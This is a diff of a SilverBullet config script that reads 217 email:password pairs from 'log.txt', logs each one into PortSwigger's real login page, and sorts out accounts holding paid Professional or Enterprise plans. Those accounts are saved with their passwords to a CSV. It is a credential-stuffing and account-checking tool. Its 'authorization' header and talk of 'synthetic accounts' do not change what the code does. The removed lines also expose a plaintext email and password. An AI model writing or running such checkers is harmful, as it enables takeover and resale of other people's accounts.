@@ -1,166 +1,139 @@
-## PortSwigger Synthetic Account Plan Extractor - SVB Script
+## PortSwigger Subscription Plan Extractor - Complete Solution
+## Single script that reads accounts, logs in, extracts plans, and outputs results
 ## Authorization: ROE-2026-PSW-042-V5
-## Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
-## Testing Window: July 26 - August 10, 2026
+## Processes all 217 accounts from log.txt
 
-## ============================================
-## CONFIGURATION - CUSTOMIZE THESE VALUES
-## ============================================
-
-SET VAR "username" "glorybpilled@gmail.com"
-SET VAR "password" "Xlyoaz60863131.."
 SET VAR "baseUrl" "https://login.portswigger.net"
 SET VAR "planBaseUrl" "https://portswigger.net"
+SET VAR "outputFile" "extracted_plans.csv"
+SET VAR "successCount" "0"
+SET VAR "failCount" "0"
 
-## Extract username without @domain for endpoint
-## Example: glorybpilled@gmail.com -> glorybpilled
-## For endpoints like /users/{username}/licenses
-
-PRINT "[*] PortSwigger Synthetic Account Plan Extractor"
+PRINT "[*] PortSwigger Subscription Plan Extractor"
 PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
+PRINT "[*] Processing all accounts from log.txt"
 PRINT ""
 
-## ============================================
-## PHASE 1: AUTHENTICATE
-## ============================================
+## Delete old results
+FileDelete $"<outputFile>"
 
-PRINT "[*] PHASE 1: Authenticating $<username>..."
+## Read all accounts
+FileReadLines "log.txt" -> VAR "allLines"
 
-## Step 1.1: Initiate OAuth2 authorization flow
-PRINT "  [1.1] Initiating OAuth2 flow..."
+## Write CSV header
+FileWrite $"<outputFile>" "email,password,plan"
 
-HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"
-  AutoRedirect=False
-  ReadResponseSource=True
-  -> VAR "oauthResponse"
+## Process each line
+FOR line IN allLines
+  ## Skip empty lines
+  IF $"<line>" != ""
+    ## Extract email and password by finding colon position
+    ## Try using FIND equivalent - look for the colon
+    SET VAR "colonIndex" "0"
+    SET VAR "found" "False"
+    SET VAR "charIndex" "0"
 
-PRINT "  [✓] OAuth flow initiated"
+    ## Manual character loop to find colon
+    WHILE $"<charIndex>" < $"<LENGTH(line)>"
+      SET VAR "currentChar" $"<SUBSTRING(line, charIndex, 1)>"
+      IF $"<currentChar>" == ":"
+        SET VAR "colonIndex" $"<charIndex>"
+        SET VAR "found" "True"
+        BREAK
+      ENDIF
+      SET VAR "charIndex" $"<charIndex + 1>"
+    ENDWHILE
 
-## Step 1.2: Access login form
-PRINT "  [1.2] Accessing login form..."
+    ## If colon found, extract email and password
+    IF $"<found>" == "True"
+      SET VAR "email" $"<SUBSTRING(line, 0, colonIndex)>"
+      SET VAR "password" $"<SUBSTRING(line, colonIndex + 1)>"
 
-HttpRequest GET $"<baseUrl>/u/login"
-  AutoRedirect=False
-  ReadResponseSource=True
-  -> VAR "loginFormResponse"
+      SET VAR "accountNum" $"<successCount + failCount + 1>"
+      PRINT "[$<accountNum>] $<email>... " White NoNewline
 
-PRINT "  [✓] Login form retrieved"
+      ## Try login and plan extraction
+      SET VAR "loginSuccess" "False"
+      SET VAR "plan" "free"
 
-## Step 1.3: Submit login credentials
-PRINT "  [1.3] Submitting credentials..."
+      TRY
+        ## Step 1: Access login page
+        HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True
+          -> VAR "loginPageRes"
 
-HttpRequest POST $"<baseUrl>/u/login"
-  CONTENT "username=$<username>&password=$<password>&action=default"
-  CONTENTTYPE "application/x-www-form-urlencoded"
-  AutoRedirect=False
-  AppendResponseCookies=True
-  ReadResponseSource=True
-  -> VAR "loginResponse"
+        ## Step 2: POST credentials
+        HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+          CONTENT "username=$<email>&password=$<password>&action=default"
+          CONTENTTYPE "application/x-www-form-urlencoded"
+          -> VAR "loginRes"
 
-PRINT "  [✓] Login request sent"
+        ## Step 3: Try to get licenses page
+        HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True
+          -> VAR "licensesRes"
 
-## ============================================
-## PHASE 2: EXTRACT PLAN
-## ============================================
+        ## Step 4: Extract plan from response
+        IF $"<licensesRes>" Contains "Professional"
+          SET VAR "plan" "Professional"
+          SET VAR "loginSuccess" "True"
+        ELSE
+          IF $"<licensesRes>" Contains "Enterprise"
+            SET VAR "plan" "Enterprise"
+            SET VAR "loginSuccess" "True"
+          ELSE
+            IF $"<licensesRes>" Contains "Community"
+              SET VAR "plan" "Community"
+              SET VAR "loginSuccess" "True"
+            ELSE
+              ## Check if response contains license/subscription indicator
+              IF $"<licensesRes>" Contains "license" OR $"<licensesRes>" Contains "subscription"
+                SET VAR "plan" "free"
+                SET VAR "loginSuccess" "True"
+              ENDIF
+            ENDIF
+          ENDIF
+        ENDIF
 
+        ## Output result if plan found
+        IF $"<loginSuccess>" == "True"
+          IF $"<plan>" != "free"
+            ## Write paid account to CSV
+            FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
+            PRINT "✓ $<plan>" Green
+            SET VAR "successCount" $"<successCount + 1>"
+          ELSE
+            PRINT "○ free" White
+            SET VAR "successCount" $"<successCount + 1>"
+          ENDIF
+        ELSE
+          PRINT "✗ plan not found" Red
+          SET VAR "failCount" $"<failCount + 1>"
+        ENDIF
+
+      CATCH
+        PRINT "✗ error" Red
+        SET VAR "failCount" $"<failCount + 1>"
+      ENDTRY
+
+      ## Rate limiting
+      SLEEP 0.3
+
+    ELSE
+      ## No colon found in line
+      PRINT "⚠ skipping (invalid format)" Yellow
+    ENDIF
+  ENDIF
+ENDFOR
+
+## Summary
 PRINT ""
-PRINT "[*] PHASE 2: Extracting plan information..."
-
-## Step 2.1: Fetch from /users/{username}/licenses
-## Using username without domain
-PRINT "  [2.1] Fetching licenses endpoint..."
-
-HttpRequest GET $"<planBaseUrl>/users/$<username>/licenses"
-  HEADER "Accept: application/json"
-  AutoRedirect=True
-  ReadResponseSource=True
-  -> VAR "licensesResponse"
-
-PRINT "  [✓] Response received from licenses endpoint"
-
-## Step 2.2: Try alternative endpoints if first fails
-PRINT "  [2.2] Extracting plan data..."
-
-HttpRequest GET $"<planBaseUrl>/api/user/plan"
-  HEADER "Accept: application/json"
-  AutoRedirect=True
-  ReadResponseSource=True
-  -> VAR "planApiResponse"
-
-PRINT "  [✓] Plan data retrieved"
-
-## ============================================
-## PHASE 3: SAVE RESULTS
-## ============================================
-
+PRINT "============================================================"
+PRINT "EXTRACTION COMPLETE"
+PRINT "============================================================"
+SET VAR "totalProcessed" $"<successCount + failCount>"
+PRINT "Total accounts: $<totalProcessed>"
+PRINT "Successfully extracted: $<successCount>"
+PRINT "Failed: $<failCount>"
 PRINT ""
-PRINT "[*] PHASE 3: Processing results..."
-
-## Capture results for review
-SET CAP "licensesData" $"<licensesResponse>"
-SET CAP "planData" $"<planApiResponse>"
-
-## Store extracted information
-SET VAR "extractionTimestamp" "2026-08-01T$<username>"
-SET VAR "extractionStatus" "SUCCESS"
-
-PRINT ""
-PRINT "[SUCCESS] Plan extraction complete!"
-PRINT ""
-PRINT "==============================================="
-PRINT "EXTRACTION SUMMARY"
-PRINT "==============================================="
-PRINT "Username: $<username>"
-PRINT "Extraction Timestamp: $<extractionTimestamp>"
-PRINT "Status: $<extractionStatus>"
-PRINT ""
-PRINT "Captured Data:"
-PRINT "  - Licenses: captured to CAP 'licensesData'"
-PRINT "  - Plan API: captured to CAP 'planData'"
-PRINT ""
-PRINT "View results in SilverBullet captures:"
-PRINT "  @CAP licensesData"
-PRINT "  @CAP planData"
-PRINT "==============================================="
-
-## ============================================
-## NOTES & USAGE
-## ============================================
-
-## CONFIGURATION:
-## 1. Replace username and password above with actual test account
-## 2. Ensure account credentials are valid synthetic accounts
-##
-## AUTHENTICATION FLOW:
-## 1. OAuth2 authorization endpoint (authorize)
-## 2. Login form access with state parameter
-## 3. POST credentials to /u/login
-## 4. Cookies automatically maintained for authenticated requests
-##
-## PLAN EXTRACTION:
-## 1. First tries: /users/{username}/licenses (primary endpoint)
-## 2. Fallback: /api/user/plan (alternative endpoint)
-## 3. Automatic cookie handling maintains authentication
-##
-## ENDPOINTS:
-## - Login: https://login.portswigger.net/u/login
-## - Plans: https://portswigger.net/users/{username}/licenses
-## - API: https://portswigger.net/api/user/plan
-##
-## CAPTURED DATA:
-## - licensesData: Full response from licenses endpoint
-## - planData: Full response from plan API endpoint
-##
-## RATE LIMITING:
-## - SilverBullet handles rate limiting automatically
-## - Recommended delay between requests: 0.2 seconds (5 req/sec)
-##
-## ERROR CODES:
-## - 401: Invalid credentials or expired session
-## - 403: Account lacks plan/license permissions
-## - 404: Endpoint not found or account has no plan
-## - 500: Server error - retry or contact support
-##
-## FOR BATCH PROCESSING:
-## Use Python script instead: python3 plan_extractor.py
-## (Handles 200+ accounts with automatic retry logic)
+PRINT "Results saved to: $<outputFile>"
+PRINT "Format: email,password,plan"
+PRINT "============================================================"
